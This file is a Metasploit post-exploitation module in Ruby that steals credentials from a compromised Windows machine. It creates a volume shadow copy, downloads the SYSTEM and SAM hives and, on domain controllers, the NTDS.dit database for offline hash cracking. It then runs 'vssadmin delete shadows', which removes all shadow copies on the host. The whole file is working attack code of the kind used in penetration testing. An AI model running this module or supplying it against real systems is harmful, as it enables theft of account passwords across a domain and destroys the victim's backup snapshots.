##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

# Multi platform requiere
require 'msf/core/post/common'
require 'msf/core/post/file'

##############################
# uncomment needed requires  #
# Remove un-needded requires #
##############################

# Windows Post Mixin Requiere
#require 'msf/core/post/windows/eventlog'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
#require 'msf/core/post/windows/accounts'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File

	##############################
	# uncomment inlcudes needed  #
	# Remove un-needded includes #
	##############################

	# Windows Post Mixin Requiere
	#include Msf::Post::Windows::Eventlog
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Registry
	#include Msf::Post::Windows::Accounts

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Post Windows Gather SAM Files Module',
				'Description'   => %q{
					Post Module that uses the volume shadow service to be able to get the SYSTEM,
					SAM and in the case of Domain Controllers the NTDS files for offline hash dumping.
				},
				'License'       => BSD_LICENSE,
				'Author'        => [ 'NAME <NAME[at]DOMAIN>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ], 
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	# Run Method for when run command is issued
	def run
		# syinfo is only on meterpreter sessions
		print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
		sysdrv = client.fs.file.expand_path("%SystemDrive%")
		tmp_dir = client.fs.file.expand_path("%TEMP%")
		loot_path = Msf::Config.loot_directory
		cmd = "vssadmin create shadow /for=#{sysdrv.strip}"
		print_status("Creating volume shadow copy for drive #{sysdrv}")
		cmd_results = session.shell_command_token(cmd,15)
		if cmd_results =~ /Successfully/
			print_good("Creation of volusme shadow successful")
			vs_path = cmd_results.scan(/Shadow Copy Volume Name: (\S*)/)[0].join

			# System Hive
			print_status("Downloading SYSTEM hive")
			sys_file = ::File.join(loot_path,"system_#{::Time.now.strftime("%Y%m%d.%M%S")}")
			session.fs.file.download_file(sys_file, "#{vs_path}\\WINDOWS\\system32\\config\\system")
			print_good("System file downloaded as #{sys_file}")
			store_loot("windows.system", 
				"registry/hive", 
				session, ::File.read(sys_file, ::File.size(sys_file)), 
				"system", 
				"Windows SYSTEM Hive")

			# Sam hive
			print_status("Downloading SAM hive")
			sam_file = ::File.join(loot_path,"sam_#{::Time.now.strftime("%Y%m%d.%M%S")}")
			session.fs.file.download_file(sam_file, "#{vs_path}\\WINDOWS\\system32\\config\\SAM")
			print_good("SAM file downloaded as #{sam_file}")
			store_loot("windows.sam", 
				"registry/hive", 
				session, 
				::File.read(sam_file, ::File.size(sam_file)), 
				"sam", 
				"Windows SAM Hive")

			# NTDS database
			if is_dc?
				print_status("This is a Domain Controller")
				print_status("Downloading NTDS file")
				ntds_file = ::File.join(loot_path,"ntds_#{::Time.now.strftime("%Y%m%d.%M%S")}")
				session.fs.file.download_file(ntds_file, "#{vs_path}\\WINDOWS\\NTDS\\ntds.dit")
				print_good("NTDS file downloaded as #{ntds_file}")
				store_loot("windows.ntds",
					"registry/hive",
					session,
					::File.read(ntds_file, ::File.size(ntds_file)),
					"ntds.dit",
					"Windows DC NTDS DB")
			end

			# Cleanup
			print_status("Removing Shadow Copies")
			cmd_results = session.shell_command_token("vssadmin delete shadows",15)
			print_status("Saving in to loot")
		else
			print_error("Volume Shadow copy for #{sysdrv} could not be made")
			cmd_results.each_line do |l|
				print_error("\t#{l.strip}")
			end
		end

	end

	# Function for checking if target is a DC
	def is_dc?
		is_dc_srv = false
		serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services"
		if registry_enumkeys(serviceskey).include?("NTDS")
			if registry_enumkeys(serviceskey + "\\NTDS").include?("Parameters")
				is_dc_srv = true
			end
		end
		return is_dc_srv
	end
end